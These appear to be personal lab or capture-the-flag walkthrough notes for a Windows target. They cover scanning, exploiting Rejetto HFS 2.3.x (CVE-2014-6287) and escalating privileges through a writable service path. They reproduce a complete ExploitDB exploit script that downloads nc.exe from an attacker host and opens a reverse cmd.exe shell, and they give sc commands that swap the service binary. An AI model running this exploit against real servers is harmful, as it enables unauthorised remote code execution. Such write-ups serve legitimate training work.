- ### Scanning & Enumeration
	- **nmap** results
		- Fast Scan
			- ![Screenshot 2024-07-28 230303.png](../assets/Screenshot_2024-07-28_230303_1722314700844_0.png)
		- In-Depth Scan
			- ![Screenshot 2024-07-28 230406.png](../assets/Screenshot_2024-07-28_230406_1722314726653_0.png)
			- ![Screenshot 2024-07-28 230332.png](../assets/Screenshot_2024-07-28_230332_1722314739671_0.png)
			- ![Screenshot 2024-07-28 230346.png](../assets/Screenshot_2024-07-28_230346_1722314747620_0.png){:height 285, :width 578}
		- A *Regetto HTTP file server* is served on port `8080`
			- Version - `2.3.x` - vulnerable to `CVE-2014-6287`
- ### Initial Access
	- `auto` **Metasploit**
		- ![Screenshot 2024-07-28 230454.png](../assets/Screenshot_2024-07-28_230454_1722315028320_0.png)
		- ![Screenshot 2024-07-28 230511.png](../assets/Screenshot_2024-07-28_230511_1722315042571_0.png)
		- ![Screenshot 2024-07-28 230524.png](../assets/Screenshot_2024-07-28_230524_1722315058227_0.png)
		- ![Screenshot 2024-07-28 230534.png](../assets/Screenshot_2024-07-28_230534_1722315071953_0.png)
	- `manual`
		- Use the `Python2` script from `ExploitDB` - https://www.exploit-db.com/exploits/
			-
			  ```
			  #!/usr/bin/python2
			  # Exploit Title: HttpFileServer 2.3.x Remote Command Execution
			  # Google Dork: intext:"httpfileserver 2.3"
			  # Date: 04-01-2016
			  # Remote: Yes
			  # Exploit Author: Avinash Kumar Thapa aka "-Acid"
			  # Vendor Homepage: http://rejetto.com/
			  # Software Link: http://sourceforge.net/projects/hfs/
			  # Version: 2.3.x
			  # Tested on: Windows Server 2008 , Windows 8, Windows 7
			  # CVE : CVE-2014-6287
			  # Description: You can use HFS (HTTP File Server) to send and receive files.
			  #	       It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.
			  #	       It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux. 
			   
			  #Usage : python Exploit.py <Target IP address> <Target Port Number>
			  
			  #EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
			  #          You may need to run it multiple times for success!
			  
			  
			  import urllib2
			  import sys
			  
			  try:
			  	def script_create():
			  		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")
			  
			  	def execute_script():
			  		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")
			  
			  	def nc_run():
			  		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")
			  
			  	ip_addr = "192.168.44.128" #attack IP address
			  	local_port = "443" # attack Port number
			  	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
			  	save= "save|" + vbs
			  	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
			  	exe= "exec|"+vbs2
			  	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
			  	exe1= "exec|"+vbs3
			  	script_create()
			  	execute_script()
			  	nc_run()
			  except:
			  	print """[.]Something went wrong..!
			  	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
			  	Don't forgot to change the Local IP address and Port number on the script"""
			  	
			              
			  ```
			-
		- An `HTTP` server must be running on the attacker machine so that the script can `GET` the `nc.exe` binary
		  collapsed:: true
			- ![Screenshot 2024-07-30 092901.png](../assets/Screenshot_2024-07-30_092901_1722315984876_0.png)
		- Using the `nc.exe` binary the script will connect back the listener
			- ![Screenshot 2024-07-30 092909.png](../assets/Screenshot_2024-07-30_092909_1722315995005_0.png)
		- The script is run twice for both of the above actions to take place
			- ![Screenshot 2024-07-30 092917.png](../assets/Screenshot_2024-07-30_092917_1722316037939_0.png)
	-
- ### Privilege Escalation
	- `auto` Metasploit
		- Upload `PowerUp.ps1` script to search for *privesc* vectors
			- ![Screenshot 2024-07-28 231504.png](../assets/Screenshot_2024-07-28_231504_1722315224891_0.png)
		- Run `Invoke-AllChecks` to run the script
			- ![Screenshot 2024-07-28 231736.png](../assets/Screenshot_2024-07-28_231736_1722315270611_0.png)
		- Generate `reverse_tcp` payload
			- ![Screenshot 2024-07-28 232318.png](../assets/Screenshot_2024-07-28_232318_1722315333480_0.png)
		- Stop the vulnerable service & Upload the payload [in the execution path of the service]
			- ![Screenshot 2024-07-29 095301.png](../assets/Screenshot_2024-07-29_095301_1722315415555_0.png)
		- Start the service with a running `netcat` listener to capture the shell
			- ![Screenshot 2024-07-29 095353.png](../assets/Screenshot_2024-07-29_095353_1722315482525_0.png)
			- ![Screenshot 2024-07-29 095415.png](../assets/Screenshot_2024-07-29_095415_1722315501627_0.png)
			- ![Screenshot 2024-07-29 095521.png](../assets/Screenshot_2024-07-29_095521_1722315510795_0.png)
	- `manual`
		- For enumeration of `privesc` vectors -> use `WinPEAS`
			- ![Screenshot 2024-07-30 093656.png](../assets/Screenshot_2024-07-30_093656_1722316144315_0.png)
			- ![Screenshot 2024-07-30 093702.png](../assets/Screenshot_2024-07-30_093702_1722316150991_0.png)
		- On running `WinPEAS`
		  collapsed:: true
			- ![Screenshot 2024-07-30 094010.png](../assets/Screenshot_2024-07-30_094010_1722316216532_0.png)
			- ![Screenshot 2024-07-30 093934.png](../assets/Screenshot_2024-07-30_093934_1722316191389_0.png)
			- ![Screenshot 2024-07-30 093951.png](../assets/Screenshot_2024-07-30_093951_1722316199532_0.png)
		- Stop the running service - `sc stop AdvancedSystemCareService9`
		- Get the payload executable from the our HTTP server
			- ![Screenshot 2024-07-30 094950.png](../assets/Screenshot_2024-07-30_094950_1722316303431_0.png)
		- Start the service with the payload in execution path - `sc start AdvancedSystemCareService9`
			- ![124.png](../assets/124_1722316495566_0.png){:height 220, :width 578}
			- ![123.png](../assets/123_1722316551686_0.png)
